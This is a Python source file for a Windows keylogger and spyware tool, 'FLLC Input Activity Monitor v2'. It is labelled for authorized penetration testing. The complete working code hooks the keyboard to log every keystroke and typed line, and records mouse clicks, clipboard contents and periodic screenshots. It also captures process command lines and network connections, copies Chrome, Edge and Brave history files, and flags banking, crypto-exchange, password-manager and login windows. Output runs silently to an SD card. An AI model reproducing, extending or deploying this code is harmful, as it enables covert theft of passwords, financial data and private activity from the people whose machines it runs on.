#!/usr/bin/env python3
"""
FLLC - Input Activity Monitor v2
======================================
v1.777 | 2026

Records ALL user input activity on a target Windows machine:
  - Keystrokes (with window context & typed line capture)
  - Mouse clicks (with coordinates and window under cursor)
  - Active window changes (what the user opens/switches to)
  - Clipboard changes (text, URLs, files)
  - URL bar captures from browsers
  - Periodic screenshots (Win32 GDI, no PIL needed)
  - Process launch monitoring with command-line capture
  - Active network connection tracking
  - Browser history file monitoring
  - Credential-containing window detection

All data is logged to the MICRO SD card in structured format.

Dependencies (pure Python where possible):
    pip install pynput psutil

Fallback: Uses ctypes + win32 API directly if pynput unavailable.

AUTHORIZED USE ONLY - Penetration testing with written permission.
FLLC
"""

import os
import sys
import time
import json
import ctypes
import ctypes.wintypes
import threading
import argparse
import atexit
import subprocess
import struct
import shutil
from pathlib import Path
from datetime import datetime
from collections import deque

# ============================================================================
#  OPTIONAL IMPORTS (graceful degradation)
# ============================================================================

try:
    from pynput import keyboard as kb
    from pynput import mouse as ms
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

# ============================================================================
#  WIN32 API CONSTANTS & FUNCTIONS
# ============================================================================

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

# For GetForegroundWindow / GetWindowText
GetForegroundWindow = user32.GetForegroundWindow
GetWindowTextW = user32.GetWindowTextW
GetWindowTextLengthW = user32.GetWindowTextLengthW
GetWindowThreadProcessId = user32.GetWindowThreadProcessId

# For clipboard
CF_UNICODETEXT = 13
OpenClipboard = user32.OpenClipboard
CloseClipboard = user32.CloseClipboard
GetClipboardData = user32.GetClipboardData

# For low-level keyboard hook (fallback if no pynput)
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104

HOOKPROC = ctypes.CFUNCTYPE(
    ctypes.c_long,
    ctypes.c_int,
    ctypes.wintypes.WPARAM,
    ctypes.wintypes.LPARAM
)


class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ('vkCode', ctypes.wintypes.DWORD),
        ('scanCode', ctypes.wintypes.DWORD),
        ('flags', ctypes.wintypes.DWORD),
        ('time', ctypes.wintypes.DWORD),
        ('dwExtraInfo', ctypes.POINTER(ctypes.c_ulong)),
    ]


# Virtual key code to readable name mapping
VK_MAP = {
    0x08: '[BACKSPACE]', 0x09: '[TAB]', 0x0D: '[ENTER]', 0x1B: '[ESC]',
    0x20: ' ', 0x21: '[PGUP]', 0x22: '[PGDN]', 0x23: '[END]',
    0x24: '[HOME]', 0x25: '[LEFT]', 0x26: '[UP]', 0x27: '[RIGHT]',
    0x28: '[DOWN]', 0x2C: '[PRTSC]', 0x2D: '[INSERT]', 0x2E: '[DELETE]',
    0x5B: '[LWIN]', 0x5C: '[RWIN]', 0x70: '[F1]', 0x71: '[F2]',
    0x72: '[F3]', 0x73: '[F4]', 0x74: '[F5]', 0x75: '[F6]',
    0x76: '[F7]', 0x77: '[F8]', 0x78: '[F9]', 0x79: '[F10]',
    0x7A: '[F11]', 0x7B: '[F12]', 0x90: '[NUMLOCK]', 0x91: '[SCROLLLOCK]',
    0xA0: '[LSHIFT]', 0xA1: '[RSHIFT]', 0xA2: '[LCTRL]', 0xA3: '[RCTRL]',
    0xA4: '[LALT]', 0xA5: '[RALT]', 0x14: '[CAPSLOCK]',
}


# ============================================================================
#  UTILITY FUNCTIONS
# ============================================================================

def get_active_window_title():
    """Get the title of the currently focused window."""
    try:
        hwnd = GetForegroundWindow()
        length = GetWindowTextLengthW(hwnd)
        if length > 0:
            buf = ctypes.create_unicode_buffer(length + 1)
            GetWindowTextW(hwnd, buf, length + 1)
            return buf.value
    except Exception:
        pass
    return ""


def get_active_window_process():
    """Get the process name of the currently focused window."""
    try:
        hwnd = GetForegroundWindow()
        pid = ctypes.wintypes.DWORD()
        GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        if HAS_PSUTIL and pid.value:
            proc = psutil.Process(pid.value)
            return proc.name()
    except Exception:
        pass
    return ""


def get_clipboard_text():
    """Get current clipboard text content."""
    try:
        OpenClipboard(0)
        handle = GetClipboardData(CF_UNICODETEXT)
        if handle:
            data = ctypes.c_wchar_p(handle)
            text = data.value
            CloseClipboard()
            return text
        CloseClipboard()
    except Exception:
        pass
    return ""


def find_output_drive():
    """Auto-detect the MICRO SD drive or fallback."""
    script_dir = os.path.dirname(os.path.abspath(__file__))

    # Check if running from a removable drive already
    script_drive = os.path.splitdrive(script_dir)[0]
    if script_drive and os.path.exists(script_drive + "\\"):
        return script_drive + "\\"

    # Windows: look for MICRO or I: drive
    for letter in ['I', 'H', 'J', 'K', 'L', 'M']:
        drive = f"{letter}:\\"
        if os.path.exists(drive):
            return drive

    return script_dir


# ============================================================================
#  INPUT MONITOR
# ============================================================================

class InputMonitor:
    """
    Comprehensive input activity monitor.
    Records keystrokes, mouse clicks, window changes, and clipboard.
    """

    def __init__(self, output_dir=None, flush_interval=10, max_log_mb=500):
        self.output_base = output_dir or find_output_drive()
        self.log_dir = os.path.join(self.output_base, 'collected', 'input_logs')
        os.makedirs(self.log_dir, exist_ok=True)

        self.flush_interval = flush_interval  # seconds between disk writes
        self.max_log_mb = max_log_mb

        # Session ID
        self.session_start = datetime.now()
        self.session_id = self.session_start.strftime('%Y%m%d_%H%M%S')
        self.hostname = os.environ.get('COMPUTERNAME', 'unknown')
        self.username = os.environ.get('USERNAME', 'unknown')

        # Log files
        self.keystroke_file = os.path.join(self.log_dir, f'keys_{self.session_id}.log')
        self.activity_file = os.path.join(self.log_dir, f'activity_{self.session_id}.jsonl')
        self.summary_file = os.path.join(self.log_dir, f'summary_{self.session_id}.txt')

        # Buffers
        self.key_buffer = deque(maxlen=10000)
        self.activity_buffer = deque(maxlen=5000)
        self.current_line = []  # Current typing line

        # State tracking
        self.last_window = ""
        self.last_clipboard = ""
        self.running = False
        self.lock = threading.Lock()

        # Stats
        self.stats = {
            'keystrokes': 0,
            'mouse_clicks': 0,
            'window_switches': 0,
            'clipboard_changes': 0,
            'urls_captured': 0,
        }

        # Write session header
        self._write_session_header()

    def _write_session_header(self):
        """Write session info to log files."""
        header = (
            f"=== FLLC INPUT MONITOR ===\n"
            f"Session:  {self.session_id}\n"
            f"Host:     {self.hostname}\n"
            f"User:     {self.username}\n"
            f"Started:  {self.session_start.isoformat()}\n"
            f"{'=' * 40}\n\n"
        )
        with open(self.keystroke_file, 'w', encoding='utf-8') as f:
            f.write(header)

    def _timestamp(self):
        return datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]

    def _log_activity(self, event_type, data):
        """Log a structured activity event."""
        event = {
            'ts': self._timestamp(),
            'type': event_type,
            'window': get_active_window_title(),
            'process': get_active_window_process(),
            **data,
        }
        with self.lock:
            self.activity_buffer.append(json.dumps(event, ensure_ascii=False))

    def _flush_buffers(self):
        """Write buffered data to disk."""
        with self.lock:
            # Flush keystrokes
            if self.key_buffer:
                keys = list(self.key_buffer)
                self.key_buffer.clear()
                try:
                    with open(self.keystroke_file, 'a', encoding='utf-8') as f:
                        f.write(''.join(keys))
                except Exception:
                    pass

            # Flush activity events
            if self.activity_buffer:
                events = list(self.activity_buffer)
                self.activity_buffer.clear()
                try:
                    with open(self.activity_file, 'a', encoding='utf-8') as f:
                        for event in events:
                            f.write(event + '\n')
                except Exception:
                    pass

    def _check_storage(self):
        """Check if log directory exceeds max size."""
        total = 0
        try:
            for f in Path(self.log_dir).rglob('*'):
                if f.is_file():
                    total += f.stat().st_size
        except Exception:
            pass
        return (total / (1024 * 1024)) < self.max_log_mb

    # ====================================================================
    #  KEYSTROKE HANDLING
    # ====================================================================

    def on_key_press(self, key):
        """Handle a key press event."""
        self.stats['keystrokes'] += 1
        ts = self._timestamp()
        window = get_active_window_title()

        # Check for window change
        if window != self.last_window:
            self._on_window_change(window)

        try:
            # pynput key object
            if hasattr(key, 'char') and key.char is not None:
                char = key.char
                self.key_buffer.append(char)
                self.current_line.append(char)
            elif hasattr(key, 'name'):
                name = key.name
                if name == 'enter':
                    # Capture the completed line
                    line_text = ''.join(self.current_line)
                    self.key_buffer.append('\n')
                    self.current_line.clear()
                    if line_text.strip():
                        self._log_activity('typed_line', {
                            'text': line_text,
                        })
                        # Check if it looks like a URL
                        if any(p in line_text.lower() for p in ['http://', 'https://', 'www.', '.com', '.org', '.net']):
                            self.stats['urls_captured'] += 1
                            self._log_activity('url_typed', {'url': line_text.strip()})
                elif name == 'backspace':
                    self.key_buffer.append('[BS]')
                    if self.current_line:
                        self.current_line.pop()
                elif name == 'space':
                    self.key_buffer.append(' ')
                    self.current_line.append(' ')
                elif name == 'tab':
                    self.key_buffer.append('[TAB]')
                elif name in ('shift', 'shift_r', 'shift_l'):
                    pass  # Don't log modifier-only presses
                elif name in ('ctrl_l', 'ctrl_r', 'alt_l', 'alt_r', 'alt_gr'):
                    pass
                elif name == 'caps_lock':
                    self.key_buffer.append('[CAPS]')
                else:
                    self.key_buffer.append(f'[{name.upper()}]')
            else:
                self.key_buffer.append(f'[?{key}]')
        except Exception:
            pass

    def on_key_press_vk(self, vk_code):
        """Handle key press from low-level hook (fallback, no pynput)."""
        self.stats['keystrokes'] += 1
        window = get_active_window_title()

        if window != self.last_window:
            self._on_window_change(window)

        if vk_code in VK_MAP:
            mapped = VK_MAP[vk_code]
            if mapped == '[ENTER]':
                line_text = ''.join(self.current_line)
                self.key_buffer.append('\n')
                self.current_line.clear()
                if line_text.strip():
                    self._log_activity('typed_line', {'text': line_text})
            elif mapped == '[BACKSPACE]':
                self.key_buffer.append('[BS]')
                if self.current_line:
                    self.current_line.pop()
            else:
                self.key_buffer.append(mapped)
        elif 0x30 <= vk_code <= 0x39:
            # Number keys
            char = chr(vk_code)
            self.key_buffer.append(char)
            self.current_line.append(char)
        elif 0x41 <= vk_code <= 0x5A:
            # Letter keys
            caps = ctypes.windll.user32.GetKeyState(0x14) & 1
            shift = ctypes.windll.user32.GetKeyState(0xA0) & 0x8000
            if caps ^ bool(shift):
                char = chr(vk_code)
            else:
                char = chr(vk_code + 32)
            self.key_buffer.append(char)
            self.current_line.append(char)
        elif vk_code in (0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF, 0xC0, 0xDB, 0xDC, 0xDD, 0xDE):
            # OEM keys (;=,-./`[\]')
            oem_map = {
                0xBA: ';', 0xBB: '=', 0xBC: ',', 0xBD: '-',
                0xBE: '.', 0xBF: '/', 0xC0: '`', 0xDB: '[',
                0xDC: '\\', 0xDD: ']', 0xDE: "'",
            }
            char = oem_map.get(vk_code, '?')
            self.key_buffer.append(char)
            self.current_line.append(char)

    # ====================================================================
    #  MOUSE HANDLING
    # ====================================================================

    def on_mouse_click(self, x, y, button, pressed):
        """Handle mouse click events."""
        if pressed:
            self.stats['mouse_clicks'] += 1
            btn_name = button.name if hasattr(button, 'name') else str(button)
            self._log_activity('mouse_click', {
                'x': x,
                'y': y,
                'button': btn_name,
            })

    # ====================================================================
    #  WINDOW & CLIPBOARD MONITORING
    # ====================================================================

    def _on_window_change(self, new_window):
        """Handle when the user switches to a different window."""
        if new_window and new_window != self.last_window:
            self.stats['window_switches'] += 1
            ts = self._timestamp()

            # Log the window switch with a header in keystroke file
            self.key_buffer.append(f'\n\n--- [{ts}] {new_window} ---\n')

            self._log_activity('window_switch', {
                'from_window': self.last_window,
                'to_window': new_window,
            })

            # Detect browser URL bar content
            lower = new_window.lower()
            browsers = ['chrome', 'firefox', 'edge', 'opera', 'brave', 'safari', 'vivaldi']
            if any(b in lower for b in browsers):
                # Browser window titles often contain the page title and sometimes URL
                self._log_activity('browser_activity', {
                    'page_title': new_window,
                })

            self.last_window = new_window

    def _monitor_clipboard(self):
        """Periodically check for clipboard changes."""
        while self.running:
            try:
                current = get_clipboard_text()
                if current and current != self.last_clipboard:
                    self.stats['clipboard_changes'] += 1
                    self.last_clipboard = current
                    self._log_activity('clipboard', {
                        'content': current[:2000],  # Truncate very long clipboard
                    })
                    # Check if clipboard contains a URL
                    if any(p in current.lower() for p in ['http://', 'https://']):
                        self.stats['urls_captured'] += 1
                        self._log_activity('url_clipboard', {'url': current.strip()[:500]})
            except Exception:
                pass
            time.sleep(2)

    def _monitor_windows(self):
        """Periodically check for active window changes."""
        while self.running:
            try:
                current = get_active_window_title()
                if current and current != self.last_window:
                    self._on_window_change(current)
            except Exception:
                pass
            time.sleep(0.5)

    # ====================================================================
    #  SCREENSHOT CAPTURE
    # ====================================================================

    def _capture_screenshots(self, interval=30):
        """Capture periodic screenshots of the user's desktop."""
        screenshot_dir = os.path.join(self.log_dir, 'screenshots')
        os.makedirs(screenshot_dir, exist_ok=True)

        while self.running:
            try:
                ts = datetime.now().strftime('%Y%m%d_%H%M%S')
                filepath = os.path.join(screenshot_dir, f'scr_{ts}.bmp')

                # Win32 API screenshot — no external dependencies
                hdesktop = user32.GetDesktopWindow()
                width = user32.GetSystemMetrics(0)   # SM_CXSCREEN
                height = user32.GetSystemMetrics(1)   # SM_CYSCREEN

                gdi32 = ctypes.windll.gdi32
                hdc = user32.GetDC(hdesktop)
                memdc = gdi32.CreateCompatibleDC(hdc)
                hbitmap = gdi32.CreateCompatibleBitmap(hdc, width, height)
                gdi32.SelectObject(memdc, hbitmap)
                gdi32.BitBlt(memdc, 0, 0, width, height, hdc, 0, 0, 0x00CC0020)  # SRCCOPY

                # Save to BMP using Win32 — no PIL needed
                class BITMAPINFOHEADER(ctypes.Structure):
                    _fields_ = [
                        ('biSize', ctypes.c_uint32),
                        ('biWidth', ctypes.c_int32),
                        ('biHeight', ctypes.c_int32),
                        ('biPlanes', ctypes.c_uint16),
                        ('biBitCount', ctypes.c_uint16),
                        ('biCompression', ctypes.c_uint32),
                        ('biSizeImage', ctypes.c_uint32),
                        ('biXPelsPerMeter', ctypes.c_int32),
                        ('biYPelsPerMeter', ctypes.c_int32),
                        ('biClrUsed', ctypes.c_uint32),
                        ('biClrImportant', ctypes.c_uint32),
                    ]

                bmi = BITMAPINFOHEADER()
                bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
                bmi.biWidth = width
                bmi.biHeight = -height  # top-down
                bmi.biPlanes = 1
                bmi.biBitCount = 24
                bmi.biCompression = 0
                bmi.biSizeImage = width * height * 3

                pixel_data = ctypes.create_string_buffer(bmi.biSizeImage)
                gdi32.GetDIBits(memdc, hbitmap, 0, height, pixel_data, ctypes.byref(bmi), 0)

                # Write BMP file
                row_size = ((width * 3 + 3) // 4) * 4
                bmp_size = 54 + row_size * height
                with open(filepath, 'wb') as f:
                    # BMP header
                    f.write(b'BM')
                    f.write(bmp_size.to_bytes(4, 'little'))
                    f.write(b'\x00\x00\x00\x00')
                    f.write((54).to_bytes(4, 'little'))
                    # DIB header
                    f.write((40).to_bytes(4, 'little'))
                    f.write(width.to_bytes(4, 'little', signed=True))
                    f.write(height.to_bytes(4, 'little', signed=True))
                    f.write((1).to_bytes(2, 'little'))
                    f.write((24).to_bytes(2, 'little'))
                    f.write(b'\x00' * 24)
                    f.write(pixel_data.raw)

                # Cleanup GDI objects
                gdi32.DeleteObject(hbitmap)
                gdi32.DeleteDC(memdc)
                user32.ReleaseDC(hdesktop, hdc)

                self.stats['screenshots'] = self.stats.get('screenshots', 0) + 1
                self._log_activity('screenshot', {'file': filepath, 'width': width, 'height': height})

            except Exception:
                pass

            time.sleep(interval)

    # ====================================================================
    #  PROCESS MONITORING
    # ====================================================================

    def _monitor_processes(self, interval=10):
        """Monitor for new process launches and their command lines."""
        known_pids = set()
        proc_log = os.path.join(self.log_dir, f'processes_{self.session_id}.jsonl')

        # Initial snapshot
        if HAS_PSUTIL:
            for proc in psutil.process_iter(['pid']):
                known_pids.add(proc.info['pid'])

        while self.running:
            try:
                if HAS_PSUTIL:
                    for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'username', 'create_time']):
                        pid = proc.info['pid']
                        if pid not in known_pids:
                            known_pids.add(pid)
                            entry = {
                                'ts': self._timestamp(),
                                'type': 'process_start',
                                'pid': pid,
                                'name': proc.info.get('name', ''),
                                'cmdline': ' '.join(proc.info.get('cmdline') or []),
                                'user': proc.info.get('username', ''),
                            }
                            with open(proc_log, 'a', encoding='utf-8') as f:
                                f.write(json.dumps(entry, ensure_ascii=False) + '\n')
                            # Flag interesting processes
                            cmdline_lower = entry['cmdline'].lower()
                            if any(k in cmdline_lower for k in [
                                'password', 'secret', 'token', 'ssh ', 'rdp',
                                'vpn', 'keepass', 'lastpass', '1password',
                                'putty', 'winscp', 'filezilla', 'ftp'
                            ]):
                                self._log_activity('interesting_process', entry)
                else:
                    # Fallback: Use WMI via PowerShell subprocess
                    try:
                        wmi_cmd = (
                            'Get-CimInstance Win32_Process | '
                            'Select-Object ProcessId,Name,CommandLine,CreationDate | '
                            'ConvertTo-Json -Compress'
                        )
                        result = subprocess.run(
                            ['powershell', '-NoProfile', '-Command', wmi_cmd],
                            capture_output=True, text=True, timeout=15
                        )
                        if result.returncode == 0 and result.stdout.strip():
                            procs = json.loads(result.stdout)
                            if isinstance(procs, dict):
                                procs = [procs]
                            for proc in procs:
                                entry = {
                                    'timestamp': datetime.now().isoformat(),
                                    'pid': proc.get('ProcessId', 0),
                                    'name': proc.get('Name', ''),
                                    'cmdline': proc.get('CommandLine', '') or '',
                                    'source': 'wmi_fallback'
                                }
                                with open(proc_log, 'a', encoding='utf-8') as f:
                                    f.write(json.dumps(entry, ensure_ascii=False) + '\n')
                                cmdline_lower = entry['cmdline'].lower()
                                if any(k in cmdline_lower for k in [
                                    'password', 'secret', 'token', 'ssh ', 'rdp',
                                    'vpn', 'keepass', 'lastpass', '1password',
                                    'putty', 'winscp', 'filezilla', 'ftp'
                                ]):
                                    self._log_activity('interesting_process', entry)
                    except Exception:
                        pass
            except Exception:
                pass
            time.sleep(interval)

    # ====================================================================
    #  NETWORK CONNECTION MONITORING
    # ====================================================================

    def _monitor_network(self, interval=30):
        """Monitor active network connections for interesting traffic."""
        net_log = os.path.join(self.log_dir, f'network_{self.session_id}.jsonl')
        known_connections = set()

        while self.running:
            try:
                if HAS_PSUTIL:
                    for conn in psutil.net_connections(kind='inet'):
                        if conn.status == 'ESTABLISHED' and conn.raddr:
                            key = (conn.laddr.port, conn.raddr.ip, conn.raddr.port, conn.pid)
                            if key not in known_connections:
                                known_connections.add(key)
                                try:
                                    proc_name = psutil.Process(conn.pid).name() if conn.pid else 'unknown'
                                except Exception:
                                    proc_name = 'unknown'
                                entry = {
                                    'ts': self._timestamp(),
                                    'type': 'network_connection',
                                    'local_port': conn.laddr.port,
                                    'remote_ip': conn.raddr.ip,
                                    'remote_port': conn.raddr.port,
                                    'pid': conn.pid,
                                    'process': proc_name,
                                }
                                # Flag interesting ports
                                interesting = {21:'FTP', 22:'SSH', 23:'Telnet', 25:'SMTP',
                                              110:'POP3', 143:'IMAP', 445:'SMB', 1433:'MSSQL',
                                              3306:'MySQL', 3389:'RDP', 5432:'Postgres',
                                              5900:'VNC', 6379:'Redis', 8080:'HTTP-Alt'}
                                if conn.raddr.port in interesting:
                                    entry['service'] = interesting[conn.raddr.port]
                                    entry['flagged'] = True
                                with open(net_log, 'a', encoding='utf-8') as f:
                                    f.write(json.dumps(entry, ensure_ascii=False) + '\n')
                else:
                    # Fallback: netstat
                    try:
                        result = subprocess.run(
                            ['netstat', '-ano'],
                            capture_output=True, text=True, timeout=15
                        )
                        if result.stdout:
                            with open(net_log, 'a', encoding='utf-8') as f:
                                f.write(f"--- {self._timestamp()} ---\n")
                                for line in result.stdout.split('\n'):
                                    if 'ESTABLISHED' in line:
                                        f.write(line.strip() + '\n')
                    except Exception:
                        pass
            except Exception:
                pass

            # Prune known set to prevent memory growth
            if len(known_connections) > 5000:
                known_connections = set(list(known_connections)[-2500:])
            time.sleep(interval)

    # ====================================================================
    #  BROWSER HISTORY SNAPSHOT
    # ====================================================================

    def _snapshot_browser_history(self):
        """Take periodic snapshots of browser history files."""
        hist_dir = os.path.join(self.log_dir, 'browser_history')
        os.makedirs(hist_dir, exist_ok=True)

        browser_history_paths = {
            'Chrome': os.path.join(os.environ.get('LOCALAPPDATA', ''),
                                   'Google', 'Chrome', 'User Data', 'Default', 'History'),
            'Edge': os.path.join(os.environ.get('LOCALAPPDATA', ''),
                                 'Microsoft', 'Edge', 'User Data', 'Default', 'History'),
            'Brave': os.path.join(os.environ.get('LOCALAPPDATA', ''),
                                  'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'History'),
        }

        while self.running:
            try:
                ts = datetime.now().strftime('%Y%m%d_%H%M%S')
                for name, path in browser_history_paths.items():
                    if os.path.exists(path):
                        try:
                            dest = os.path.join(hist_dir, f'{name}_{ts}_History')
                            shutil.copy2(path, dest)
                            self.stats['browser_snapshots'] = self.stats.get('browser_snapshots', 0) + 1
                        except (PermissionError, OSError):
                            pass
            except Exception:
                pass
            time.sleep(300)  # Every 5 minutes

    # ====================================================================
    #  CREDENTIAL WINDOW DETECTION
    # ====================================================================

    def _monitor_credential_windows(self):
        """Detect when the user is interacting with login/password windows."""
        cred_keywords = [
            'sign in', 'log in', 'login', 'password', 'credential',
            'authenticate', 'verification', 'two-factor', '2fa',
            'bank', 'paypal', 'venmo', 'cashapp', 'wallet',
            'coinbase', 'binance', 'kraken', 'exchange',
            'vpn', 'ssh', 'rdp', 'remote desktop', 'putty',
            'keepass', 'lastpass', '1password', 'bitwarden',
        ]
        last_flagged = ""

        while self.running:
            try:
                title = get_active_window_title().lower()
                if title and title != last_flagged:
                    for kw in cred_keywords:
                        if kw in title:
                            self._log_activity('credential_window', {
                                'title': get_active_window_title(),
                                'keyword': kw,
                                'process': get_active_window_process(),
                            })
                            self.stats['credential_windows'] = self.stats.get('credential_windows', 0) + 1
                            last_flagged = title
                            break
            except Exception:
                pass
            time.sleep(1)

    def _periodic_flush(self):
        """Periodically flush buffers to disk."""
        while self.running:
            time.sleep(self.flush_interval)
            self._flush_buffers()
            if not self._check_storage():
                self.running = False
                break

    # ====================================================================
    #  MAIN RUN LOOP
    # ====================================================================

    def _write_summary(self):
        """Write session summary on exit."""
        duration = (datetime.now() - self.session_start).total_seconds()
        summary = (
            f"\n{'=' * 50}\n"
            f"SESSION SUMMARY - FLLC Input Monitor v2\n"
            f"{'=' * 50}\n"
            f"Duration:          {duration:.0f} seconds ({duration/60:.1f} min)\n"
            f"Keystrokes:        {self.stats['keystrokes']}\n"
            f"Mouse clicks:      {self.stats['mouse_clicks']}\n"
            f"Window switches:   {self.stats['window_switches']}\n"
            f"Clipboard changes: {self.stats['clipboard_changes']}\n"
            f"URLs captured:     {self.stats['urls_captured']}\n"
            f"Screenshots:       {self.stats.get('screenshots', 0)}\n"
            f"Browser snapshots: {self.stats.get('browser_snapshots', 0)}\n"
            f"Cred windows:      {self.stats.get('credential_windows', 0)}\n"
            f"Log directory:     {self.log_dir}\n"
            f"{'=' * 50}\n"
        )
        try:
            with open(self.summary_file, 'w', encoding='utf-8') as f:
                f.write(summary)
            # Also append to keystroke log
            with open(self.keystroke_file, 'a', encoding='utf-8') as f:
                f.write(summary)
        except Exception:
            pass

    def _start_all_background_threads(self):
        """Start all background monitoring threads."""
        threads = [
            ("clipboard", self._monitor_clipboard),
            ("window", self._monitor_windows),
            ("flush", self._periodic_flush),
            ("screenshots", self._capture_screenshots),
            ("processes", self._monitor_processes),
            ("network", self._monitor_network),
            ("browser_hist", self._snapshot_browser_history),
            ("cred_windows", self._monitor_credential_windows),
        ]
        for name, target in threads:
            t = threading.Thread(target=target, daemon=True, name=f"mon_{name}")
            t.start()

    def run_with_pynput(self):
        """Run using pynput library (preferred method)."""
        self.running = True

        # Start all background threads
        self._start_all_background_threads()

        # Keyboard listener
        key_listener = kb.Listener(on_press=self.on_key_press)
        key_listener.daemon = True
        key_listener.start()

        # Mouse listener
        mouse_listener = ms.Listener(on_click=self.on_mouse_click)
        mouse_listener.daemon = True
        mouse_listener.start()

        atexit.register(self._shutdown)

        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            self._shutdown()

    def run_with_hooks(self):
        """Run using raw Win32 hooks (fallback, no pynput needed)."""
        self.running = True

        # Start all background threads
        self._start_all_background_threads()

        atexit.register(self._shutdown)

        # Set up low-level keyboard hook
        def low_level_keyboard_proc(nCode, wParam, lParam):
            if nCode >= 0 and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
                kb_struct = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
                self.on_key_press_vk(kb_struct.vkCode)
            return user32.CallNextHookEx(None, nCode, wParam, lParam)

        callback = HOOKPROC(low_level_keyboard_proc)
        hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, callback, kernel32.GetModuleHandleW(None), 0)

        if not hook:
            raise RuntimeError("Failed to install keyboard hook")

        # Message loop (required for hooks to work)
        msg = ctypes.wintypes.MSG()
        try:
            while self.running:
                result = user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
                if result == 0 or result == -1:
                    break
                user32.TranslateMessage(ctypes.byref(msg))
                user32.DispatchMessageW(ctypes.byref(msg))
        except KeyboardInterrupt:
            pass
        finally:
            user32.UnhookWindowsHookEx(hook)
            self._shutdown()

    def run(self):
        """Auto-select best available method and run."""
        if HAS_PYNPUT:
            self.run_with_pynput()
        else:
            self.run_with_hooks()

    def _shutdown(self):
        """Clean shutdown."""
        if self.running:
            self.running = False
            self._flush_buffers()
            self._write_summary()

    def stop(self):
        """External stop signal."""
        self.running = False


# ============================================================================
#  MAIN
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='FLLC - Input Activity Monitor (Authorized Use Only)'
    )
    parser.add_argument(
        '--output', '-o', default=None,
        help='Output drive/directory (default: auto-detect MICRO SD)'
    )
    parser.add_argument(
        '--flush', '-f', type=int, default=10,
        help='Flush interval in seconds (default: 10)'
    )
    parser.add_argument(
        '--max-size', '-m', type=int, default=500,
        help='Max log size in MB (default: 500)'
    )
    parser.add_argument(
        '--silent', '-s', action='store_true',
        help='Suppress all console output'
    )

    args = parser.parse_args()

    monitor = InputMonitor(
        output_dir=args.output,
        flush_interval=args.flush,
        max_log_mb=args.max_size,
    )

    if not args.silent:
        print(f"""
  =============================================
   FLLC - Input Activity Monitor v2 (1.777)
  =============================================
   Host:       {monitor.hostname}
   User:       {monitor.username}
   Method:     {'pynput' if HAS_PYNPUT else 'Win32 hooks'}
   Flush:      every {args.flush}s
   Max size:   {args.max_size} MB
   Output:     {monitor.log_dir}
   Threads:    8 (keys/mouse/clipboard/window/
                   screenshots/processes/network/
                   browser/credentials)
  =============================================
   Monitoring... (Ctrl+C to stop)
""")

    monitor.run()


if __name__ == '__main__':
    main()
